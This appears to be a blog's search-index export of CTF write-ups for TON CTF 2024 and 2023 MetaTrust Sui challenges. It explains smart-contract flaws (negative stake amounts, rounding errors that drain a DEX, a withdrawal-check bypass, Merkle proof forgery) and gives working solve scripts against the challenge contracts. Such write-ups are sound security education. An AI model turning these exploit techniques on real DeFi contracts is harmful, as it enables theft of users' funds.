[{"categories":["Web3"],"content":"Writeup for TON CTF 2024","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Preface The TON CTF 2024, sponsored by the TON Foundation and organized by Tonbit and TONX Studio, was an exciting competition that featured 8 challenges. The tasks were divided into three categories: 3 easy challenges worth 100 points, 3 medium challenges worth 200 points, and 2 difficult ones valued at 300 points. What made this CTF unique was that all the challenges were written in Tact, a high-level language designed for the TON ecosystem. Tact compiles down to Func, another programming language, which then further compiles into Fift and finally down to bytecode for the VM. While I had previously dabbled with Func, this was my first time working with Tact, and I picked up quite a few new things along the way. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:1:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Challenges of TON CTF vs. Other Blockchain CTFs Compared to other Web3 CTFs, the TON ecosystem presents unique challenges. First, the tooling within the TON ecosystem is still in active developing. Additionally, due to TON’s emphasis on speed, many operations, such as smart contract calls, are asynchronous. Finally, all the challenges in this CTF were deployed on a private chain, which introduced another layer of complexity when interacting with the contracts. Tact contracts offer TypeScript interfaces for interaction, but since I’m not very familiar with TypeScript and wanted more granular control over the cells being sent, I decided to write my own interaction framework in Python. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:2:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Building a Python Framework for TON Interactions The provided RPC interface was similar to Ton Center v2, which meant I could override the Client class from the tonutils library with a few modifications: from tonutils.client import Client from pytoniq_core import Address from tonutils.utils import boc_to_base64_string from tonutils.wallet import WalletV3R2 class CTFClient(Client): def __init__(self, url: str) -\u003e None: super().__init__(base_url=url, headers={}) async def run_get_method(self, address: str, method_name: str, stack: Optional[List[Any]] = None) -\u003e Any: body = { \"address\": address, \"method\": method_name, \"stack\": [ {\"type\": \"num\", \"value\": str(v)} if isinstance(v, int) else {\"type\": \"slice\", \"value\": v} for v in (stack or []) ], } return await self._post(method=\"runGetMethod\", body=body) async def send_message(self, boc: str) -\u003e None: status = await self._post(method=\"sendBoc\", body={\"boc\": boc_to_base64_string(boc)}) print(status) async def get_balance(self, address: str) -\u003e int: result = await self._get(method=\"getAddressBalance\", params={\"address\": address}) return int(result['result']) async def get_transaction(self, address: str, lt: str, txhash: str) -\u003e dict: result = await self._get(method=\"getTransactions\", params={\"address\": address, \"hash\": txhash, \"lt\": lt, 'limit': 1}) return result['result'] async def get_address_info(self, address: str) -\u003e dict: result = await self._get(method=\"getAddressInformation\", params={\"address\": address}) return result['result'] async def get_last_transaction(self, address: str) -\u003e dict: result = await self._get(method=\"getAddressInformation\", params={\"address\": address}) txhash = result['result']['last_transaction_id']['hash'] new_txhash = txhash while txhash == new_txhash: result = await self._get(method=\"getAddressInformation\", params={\"address\": address}) lt = result['result']['last_transaction_id']['lt'] new_txhash = result['result']['last_transaction_id']['hash'] print('find:', new_txhash) return await self.get_transaction(address, lt, new_txhash) class CTFWallet(WalletV3R2): @classmethod async def get_seqno(cls, client: Client, address: Union[Address, str]) -\u003e int: if isinstance(address, Address): address = address.to_str() method_result = await client.run_get_method( address=address, method_name=\"seqno\", ) return int(method_result['result'][\"stack\"][0][1], 16) As I mentioned earlier, smart contract interactions in the TON blockchain aren’t atomic. To ensure that transactions from my wallet to the challenge contract were fully executed, I added a new method to the Client class, get_last_transaction. Although the method name might not seem entirely fitting, its purpose was to wait for a new transaction (usually the one I intended) to appear in the challenge contract. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:2:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Leveraging the Framework for the CTF With this framework in place, interacting with the contracts became straightforward. After initializing a CTFWallet object, I simply used the transfer method to fill in the desired cell in the transaction body: CONTRACT = \"EQDSxcBDK2QRgtZIg9PWMDVTBZrRLgAE8cRi5mKuH_zwLs4T\" async def main(): client = CTFClient(\"http://65.21.223.95:8081/\") wallet, public_key, private_key, mnemonic = CTFWallet.from_mnemonic(client, MNEMONIC) builder = begin_cell().store_uint(0x868dd340, 32).store_uint(23019947, 257) cell = builder.end_cell() await wallet.transfer(CONTRACT, amount=1, body=cell) print(await client.get_last_transaction(CONTRACT)) print(await client.run_get_method(CONTRACT, \"is_solved\")) if __name__ == '__main__': asyncio.run(main()) This setup provided me with the flexibility and control I needed during the competition, allowing me to send tailored messages to the contract and interact efficiently with the provided tasks. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:2:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Airdrop Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/airdrop Score: 100 The first challenge in the competition was called Airdrop. As the name suggests, the contract allowed each user to claim an airdrop of 1 token. The initial supply of the contract was set to 30,000, and the goal of the challenge was to deplete this initial supply. The vulnerability, however, wasn’t in the airdrop functionality itself, but in the deposit and withdrawal functions of the contract. A common pitfall when writing smart contracts is improper usage of signed integers, and this contract fell into that trap. Signed integers should only be used when absolutely necessary, but in this contract, they were used extensively, leading to a critical vulnerability. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:3:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Vulnerability When a user staked TON, the contract checked whether the provided amount was less than the actual TON transferred. However, there was no check to ensure that amount was a positive value. This opened the door for an attacker to pass a negative amount, which allowed them to manipulate the balance. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:3:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Exploit By analyzing the compiled contract, I found that the function responsible for staking, UserStake, had a selector of f82b6291. All I had to do was pass a negative value of -30,000 as the amount to exploit the vulnerability. This would cause the contract’s balance to be manipulated. begin_cell().store_uint(0xf82b6291, 32).store_int(-30000, 257).end_cell() ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:3:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Random Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/random Score: 100 The second challenge, Random, involved guessing a lucky number. The contract would take a user-provided luckynumber parameter, and if it matched a value derived from the hash of the following cell: beginCell().storeAddress(myAddress()).storeAddress(sender()).storeUint(now(), 64).endCell() The contract would then set a flag to 1, indicating that the user had solved the challenge. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:4:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Vulnerability The contract didn’t use a native random function but rather constructed its own random number generator based on the hash of the aforementioned cell. This approach is inherently insecure since the value of now() can be reasonably estimated, which makes the random number predictable. However, given that the range of the generated random number was relatively small (from 0 to 99), instead of predicting the random number, I opted for a brute-force approach by repeatedly sending luckynumber values until I got the correct one. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:4:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Eccs Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/eccs Score: 100 The third challenge, Eccs, was added as a replacement for a previous on-chain data analysis challenge that had multiple issues in its description. The organizers eventually took that challenge down and replaced it with this one. Eccs was quite similar to the “Easy ECC” problem from the testing phase, as it implemented standard elliptic curve addition and multiplication. The goal was to solve the ECDLP. Since the problem’s scale was relatively small, I could directly use SageMath to solve the ECDLP. Interestingly, although the code defined $b = 2$, the actual b value used was 3. F = Zmod(738077334260605249) E = EllipticCurve(F, [1, 3]) p1 = E(627636259244800403, 317346088871876181) p2 = E(456557409365020317, 354112687690635257) print(p1.discrete_log(p2)) Running this script gave the solution 844279. Once Sage provided the solution, I simply had to send the following cell to solve the challenge: begin_cell().store_uint(0x868dd340, 32).store_uint(844279, 257).end_cell() ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:5:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Dex Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/dex Score: 200 Unlike the previous mathematical challenge Eccs, the Dex challenge was much more engaging, combining a common issue in DeFi—rounding errors—with some unique features of the TON blockchain. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:6:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Vulnerability If you’re familiar with auditing or securing DeFi projects, you might have quickly spotted the vulnerability in the swap implementation. The contract incorrectly rounded the out_amount up during a swap, which allowed users to exploit the rounding error for profit. However, simply exploiting the rounding error wasn’t enough to solve the challenge. After taking advantage of the bug, the contract would only set the lock variable to True. To fully solve the challenge, a second condition needed to be met: the TON balance of the contract’s account had to drop below 0.5 TON. Since the contract required a minimum of 0.14 TON for each operation, it was clear that performing just three swaps wouldn’t be enough to fully deplete the balance. This meant I had to trigger a withdrawal to reduce the contract’s balance further. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:6:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Bypassing the Withdrawal Check In the contract’s withdraw function, there was a balance check that required: require(myBalance() \u003e ton(\"1.0\") + self.storageReserve + msg.value, \"Insufficient balance\"); This check ensured that the balance of the contract, minus the amount the user wanted to withdraw, had to exceed 1 TON plus the storage reserve (0.1 TON). At first glance, this seemed like a limitation that would prevent us from depleting the contract’s balance below 0.5 TON. However, there was a clever workaround. When calling the withdraw function, if I attached a sufficiently large amount of TON, this amount would temporarily increase the myBalance() that the contract checked against. Since the actual withdrawal used the SendRemainingValue mode, the contract would return any excess TON back to me, bypassing the balance check while still allowing me to withdraw funds. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:6:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Exploit Here’s the code I used to perform the exploit: await wallet.transfer(CONTRACT, amount=0.15, body='CreateUser') print(await client.get_last_transaction(CONTRACT)) async def swap_1(amount): builder = begin_cell().store_uint(0x40e869ea, 32).store_coins(amount).store_uint(0x1, 257) cell = builder.end_cell() await wallet.transfer(CONTRACT, amount=0.15, body=cell) print(await client.get_last_transaction(CONTRACT)) async def swap_2(amount): builder = begin_cell().store_uint(0x40e869ea, 32).store_coins(amount).store_uint(0x2, 257) cell = builder.end_cell() await wallet.transfer(CONTRACT, amount=0.15, body=cell) print(await client.get_last_transaction(CONTRACT)) # Perform the swaps await swap_1(3) await swap_2(1) await swap_2(2) await swap_1(2) await swap_2(1) await swap_2(1) await swap_1(2) await swap_2(1) await swap_2(2) await swap_1(1) await swap_2(1) await swap_2(1) await swap_1(1) await swap_2(1) await swap_2(1) await swap_1(1) await swap_2(1) await swap_2(1) await swap_2(1) await swap_1(1) await swap_2(1) await swap_2(1) await swap_1(1) # Perform withdrawal with the required amount builder = begin_cell().store_uint(0xa4a52dd3, 32).store_coins(5212062305) cell = builder.end_cell() await wallet.transfer(CONTRACT, amount=2, body=cell) print(await client.get_last_transaction(CONTRACT)) # Call Solve method await wallet.transfer(CONTRACT, amount=0.1, body='Solve') print(await client.get_last_transaction(CONTRACT)) # Check if solved print(await client.run_get_method(CONTRACT, \"is_solved\")) Note: My approach to exploiting the rounding error was far from optimal. There’s room for improvement to reduce the number of swaps. The withdrawal amount I used in the code might need to be adjusted depending on the actual balance of the contract’s account at the time of the attack. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:6:3","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Puzzle Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/puzzle Score: 200 As the name suggests, the Puzzle challenge was a straightforward puzzle, but it came with a subtle trap in the contract’s code. Specifically, all the bitwise shift operations in the contract didn’t include any assignment, rendering them ineffective. Once I realized this, solving the challenge became much simpler. Ignoring the ineffective shift operations, the order of the operations wasn’t particularly important. The goal was to figure out how each operation affected the sum of the six member variables. After observing how each operation changed the sum, I could either manually adjust the values to meet the required conditions or use a solver like Z3 to automate the process. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:7:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Curve Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/curve Score: 200 The Curve challenge was another mathematical puzzle, unrelated to the core features of the TON ecosystem. It revolved around solving a discrete logarithm problem on a given curve, where the contract implemented curve addition and multiplication. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:8:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Understanding the Curve The curve’s behavior is defined in the challenge’s contract, specifically in the section that calculates the slope (m) during the point addition process: if (x1 == x2 \u0026\u0026 y1 == y2) { m = ((self.a * ((x1 + x2) % self.p) % self.p) + self.b) % self.p; } else { m = (((y2 - y1) % self.p) * self.invMod(x2 - x1, self.p)) % self.p; } By analyzing this code, we observe that the slope calculation aligns with the properties of a quadratic curve in the form $y = ax^2 + bx + c$. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:8:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Curve Addition Implementation The next part of the contract code handles the point addition on the curve: x3 = ((((m - self.b) * self.invMod(self.a, self.p)) % self.p) - self.zero.x) % self.p; y3 = (((x3 - self.zero.x) * m) % self.p + self.zero.y) % self.p; return Point{x: x3 % self.p, y: y3 % self.p}; Upon deeper inspection of the point addition implementation, we can see that the formula for $x_3$ simplifies to: $$x_3 = x_1 + x_2 - x_0$$ This observation reveals that for repeated point addition (i.e., curve multiplication), the result follows the relation: $$x_Q = k \\cdot x_P - (k - 1) \\cdot x_0$$ where $Q = k \\cdot P$. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:8:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Reducing to a DLP over $\\mathbb{F}_p$ Given this relationship, we can simplify the challenge to solving a discrete logarithm problem over $\\mathbb{F}_p$. We are tasked with finding the multiplier k that satisfies: $$k = \\frac{x_2 - x_0}{x_1 - x_0} \\pmod{p}$$ The solution can be found using the following Python script: from Crypto.Util.number import inverse p = 1124575627794835616567 x0 = 26268578989036317972 x1 = 983810924364991907519 x2 = 1098402780140240490917 k = (x2 - x0) * inverse(x1 - x0, p) % p print(k) ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:8:3","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Ecc Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/ecc Score: 300 Similar to the previous Curve challenge, this problem implemented curve addition and multiplication, requiring participants to solve the DLP between two points. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:9:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Understanding the Curve The curve’s slope calculation was defined in the contract as follows: if (x1 == x2 \u0026\u0026 y1 == y2) { m = ((((3 * ((x1 * x2) % self.p) % self.p) + 4 * x1 + 1) % self.p) * (self.invMod(y1 + y2, self.p) % self.p)) % self.p; } else { m = (((y2 - y1) % self.p) * self.invMod(x2 - x1, self.p)) % self.p; } By analyzing the slope calculation and substituting the values provided in the challenge, we deduce that the equation of the curve is: $$ y^2 = x^3 + 2x^2 + x = x(x + 1)^2 $$ This curve is singular, which is evident because it has a node. Singular curves behave differently from regular elliptic curves, and the DLP on such curves can be reduced to solving a DLP in an isomorphic group where solving DLP is much easier. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:9:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Solving the DLP For this singular curve, we can calculate the two roots of the equation: The roots are 0 and 769908256801248 (which corresponds to x = -1). For the non-zero root, α = 769908256801248, we compute the square root t = 171237201247109. With this information, we can transform the DLP on the curve into a simpler form in the isomorphic group: u = (Gy + t * (Gx - alpha)) / (Gy - t * (Gx - alpha)) v = (Py + t * (Px - alpha)) / (Py - t * (Px - alpha)) v.log(u) ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:9:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"MerkleAirdrop Challenge Info Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/merkle_airdrop Score: 300 The MerkleAirdrop challenge implemented an airdrop system based on a Merkle Tree. The challenge initialized a Merkle Tree and allowed a specific address—EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0—to claim 614 tokens. The goal was to exploit the airdrop mechanism and forge a valid claim by tampering with the Merkle Tree proof. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:10:0","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Vulnerability Upon reviewing the verify function, I noticed that the way the parent nodes in the Merkle Tree were computed was unusual. Instead of concatenating and hashing the child nodes together (as is typical for Merkle Trees), the function simply calculated the difference between the two node values. fun verify(leaf: Int, proofs: map\u003cInt, Int\u003e, proofLength: Int): Bool { let i: Int = 0; require(proofLength + 1 == self.merkleTreeHeight, \"Invalid proof length\"); while (i \u003c proofLength) { let proof: Int? = proofs.get(i); if (proof == null) { return false; } leaf = leaf \u003e proof!! ? sha256((leaf - proof!!).toString()) : sha256((proof!! - leaf).toString()); i = i + 1; } return leaf == self.merkleRoot; } Instead of the standard hashing approach, this implementation allowed us to manipulate the proof. By controlling the final input passed to the sha256 function, we could fabricate a valid proof based on a known hash. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:10:1","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"The Exploit To exploit the vulnerability, I only needed to modify the last proof element while keeping the earlier proofs intact. This adjustment let me control the input to the final sha256 operation, allowing me to bypass the verification process. The challenge provided a set of data for the Merkle Tree verification: let seedBuilder: StringBuilder = beginString(); seedBuilder.append(\"EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0\"); seedBuilder.append(\"614\"); let leaf: Int = sha256(seedBuilder.toString()); let nodes: map\u003cInt, Int\u003e = emptyMap(); nodes.set(0, 3276839473039418448246626220846442448842246862622804046064860066224006800084); nodes.set(1, 47247882347545520880400048062206626448448620004800866600228646060442282848824); nodes.set(2, 17983245880419772846408460262448682866408688862244064640442682866626888428288); Using the valid leaf, in the while loop, I dumped the values passed to the sha256 function to analyze the last round’s parameters. To modify the claim amount, I changed the target leaf value to represent a claim of 10,000 tokens. By adjusting the last proof value, I could ensure the sha256 input matched the expected value. For example: Original final sha256 input: 90114452958426129291090095054266392995908099809161431530770587638743766783525 Modified final leaf value for a 10,000 token claim: 108097698838845902137498555316715075862316788671405496171213270505370655211813 Given $leaf \u003e target$, we can set the last entry of proofs to leaf-target which is 17983245880419772846408460262448682866408688862244064640442682866626888428288 to bypass the verification. ","date":"2024-09-28","objectID":"/2024/09/TON-CTF-2024/:10:2","tags":["Web3","CTF","TON"],"title":"TON CTF 2024 Writeup","uri":"/2024/09/TON-CTF-2024/"},{"categories":["Web3"],"content":"Writeup for 2023 MetaTrust Web3 Security CTF Sui Challenges","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Preface Last week, I participated solo in the 2023 MetaTrust Web3 Security CTF. In addition to the traditional Solidity challenges, Mysten Labs and OtterSec provided four Sui Move challenges as a separate category. Fortunately, I managed to get two first bloods and two second bloods, placing me first in this specific track. Apart from these four challenges, there was also an intriguing challenge involving Move bytecode reverse engineering. Since I have previously written several related writeups, I won’t delve into it here. Interested readers can refer to the excellent writeups by ashleyhsu.eth and jinu.eth. ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:1:0","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Challenge 1: Hello World Challenge Info Say hello to Douglas Adam. Host: metatrustctf.sui.io Port: 31337 Source: https://github.com/MetaTrustLabs/ctf/tree/master/hellowWorld/ Score: 10 ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:2:0","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Target contract As the name suggests, the challenge 1 is a sanity-check to let players get familiar with Sui and the CTF framework. /* https://github.com/MetaTrustLabs/ctf/blob/master/hellowWorld/framework/src/main.rs#L100-L114 */// Check Solution letmutargs2: Vec\u003cSuiValue\u003e=Vec::new();letarg_ob2=SuiValue::Object(FakeID::Enumerated(1,0));args2.push(arg_ob2);letret_val=sui_ctf_framework::call_function(\u0026mutadapter,chall_addr,chall,\"is_owner\",args2,Some(\"challenger\".to_string()),);println!(\"[SERVER] Return value {:#?}\",ret_val);println!(\"\"); From the code framework above, we can see that this challenge checks whether the player has successfully solved it by calling the is_owner function to check the status and evaluating the return value. /* https://github.com/MetaTrustLabs/ctf/blob/master/hellowWorld/framework/chall/sources/hello_world.move#L26-L38 */// [*] Public functions publicentryfunanswer_to_life(status: \u0026mutStatus,answer: vector\u003cu8\u003e){// What is the answer to life? letactual=x\"2f0039e93a27221fcf657fb877a1d4f60307106113e885096cb44a461cd0afbf\";letanswer_hash: vector\u003cu8\u003e=hash::blake2b256(\u0026answer);assert!(actual==answer_hash,ERR_INVALID_CODE);status.solved=true;}publicentryfunis_owner(status: \u0026mutStatus){assert!(status.solved==true,0);} From the contract source code, it’s evident that setting the solved field in status to true requires calling the answer_to_life function. This function demands the user to provide the status and a u8 vector called answer. It then hashes the answer using blake2b256 and compares it to a predefined hash. If they match, the solved field is set to true. ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:2:1","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Solution This hash is clearly irreversible, but based on the hint in the comments, “What is the answer to life?” we can deduce that the answer is 42, as found in The Hitchhiker’s Guide to the Galaxy. modulesolution::hello_world_solution{usechallenge::hello_world;publicentryfunsolve(status: \u0026muthello_world::Status){letanswer: vector\u003cu8\u003e=vector[52,50];// ascii of \"42\" challenge::hello_world::answer_to_life(status,answer);}} ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:2:2","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Challenge 2: Friendly Fire Challenge Info Keep your friends close and Enemies Closer. Host: metatrustctf.sui.io Port: 31338 Source: https://github.com/MetaTrustLabs/ctf/tree/master/friendlyFire Score: 50 ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:3:0","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Target contract /* https://github.com/MetaTrustLabs/ctf/blob/master/friendlyFire/framework/chall/sources/friendly_fire.move#L27-L40 */// [*] Public functions public(friend)funget_flag(status: \u0026mutStatus){status.solved=true;}publicentryfunis_owner(status: \u0026mutStatus){assert!(status.solved==true,0);}publicentryfunprestige(status: \u0026mutStatus,ctxSender: String,_ctx: \u0026mutTxContext){// let digest: \u0026vector\u003cu8\u003e = tx_context::digest(_ctx); assert!(ctxSender==std::string::utf8(b\"0x31337690420\"),ERR_INVALID_CODE);get_flag(status);} This challenge is similar to the previous one, as it also requires us to set the solved field of status to true. However, in this challenge, the function that can modify the status is get_flag. Due to the restrictions imposed by the friend mechanism, we can only invoke get_flag through the prestige function. To do so, users need to provide ctxSender with the value 0x31337690420. ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:3:1","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Solution Since the contract doesn’t perform any checks on the user input for ctxSender (which seems rather odd), all that is required is to provide the requested value. modulesolution::friendly_fire_solution{usesui::tx_context::TxContext;usechallenge::friendly_fire;publicentryfunsolve(status: \u0026mutfriendly_fire::Status,ctx: \u0026mutTxContext){challenge::friendly_fire::prestige(status,std::string::utf8(b\"0x31337690420\"),ctx);}} ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:3:2","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Challenge 3: McChicken Challenge Info A customer just ordered from the secret menu, but none of the employees know how to cook the secret burgers. Could you please help? Host: metatrustctf.sui.io Port: 31339 Source: https://github.com/MetaTrustLabs/ctf/tree/master/McChicken Score: 200 ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:4:0","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Target contract This challenge presents an intriguing puzzle where the contract implements functions like place_order and deliver_order to simulate restaurant ordering and serving. A hamburger here can consist of five ingredients: Mayo, Lettuce, Chicken Schnitzel, Cheese, and Bun. /* https://github.com/MetaTrustLabs/ctf/blob/master/McChicken/framework/chall/sources/mc_chicken.move#L19-L23 */struct Mayohasstore,copy,drop{calories: u16 }struct Lettucehasstore,copy,drop{calories: u16 }struct ChickenSchnitzelhasstore,copy,drop{calories: u16 }struct Cheesehasstore,copy,drop{calories: u16 }struct Bunhasstore,copy,drop{calories: u16 }/* https://github.com/MetaTrustLabs/ctf/blob/master/McChicken/framework/chall/sources/mc_chicken.move#L69-L87 */publicfunget_mayo(_chef: \u0026mutChefCapability): Mayo{Mayo{calories: 679}}publicfunget_lettuce(_chef: \u0026mutChefCapability): Lettuce{Lettuce{calories: 14}}publicfunget_chicken_schnitzel(_chef: \u0026mutChefCapability): ChickenSchnitzel{ChickenSchnitzel{calories: 297}}publicfunget_cheese(_chef: \u0026mutChefCapability): Cheese{Cheese{calories: 420}}publicfunget_bun(_chef: \u0026mutChefCapability): Bun{Bun{calories: 120}} What makes it interesting is that when a user places an order for a hamburger, they provide a serialized byte sequence representing the hamburger. As chefs responsible for serving the orders, we need to deserialize the customer’s order to obtain the recipe for the hamburger they desire. ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:4:1","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Solution In the context of BCS encoding, there’s an interesting piece of trivia to note: the serialization result for a struct is essentially the serialization result of all its fields combined. In our scenario here, when it comes to serializing a burger, it means concatenating several u16 calorie values that make up its various components together. /* https://github.com/MetaTrustLabs/ctf/blob/master/McChicken/framework/src/main.rs#L84-L112 */// Place Order1 letmutorder_args: Vec\u003cSuiValue\u003e=Vec::new();letorder_args_1=SuiValue::Object(FakeID::Enumerated(3,0),None);letrecepit1=Vec::from([MoveValue::U8(0x78),MoveValue::U8(0x00),MoveValue::U8(0xa7),MoveValue::U8(0x02),MoveValue::U8(0x0e),MoveValue::U8(0x00),MoveValue::U8(0x29),MoveValue::U8(0x01),MoveValue::U8(0xa4),MoveValue::U8(0x01),MoveValue::U8(0x78),MoveValue::U8(0x00)]);order_args.push(order_args_1);order_args.push(SuiValue::MoveValue(MoveValue::Vector(recepit1)));letret_val=sui_ctf_framework::call_function(\u0026mutadapter,chall_addr,\"mc_chicken\",\"place_order\",order_args,Some(\"customer\".to_string())).await;println!(\"[SERVER] Return value {:#?}\",ret_val);println!(\"\"); Taking Order1 as an example, its serialization result has a length of 12. Therefore, we can attempt to deserialize it into six u16 numbers: In [1]: import struct In [2]: struct.unpack(\"\u003c6H\", 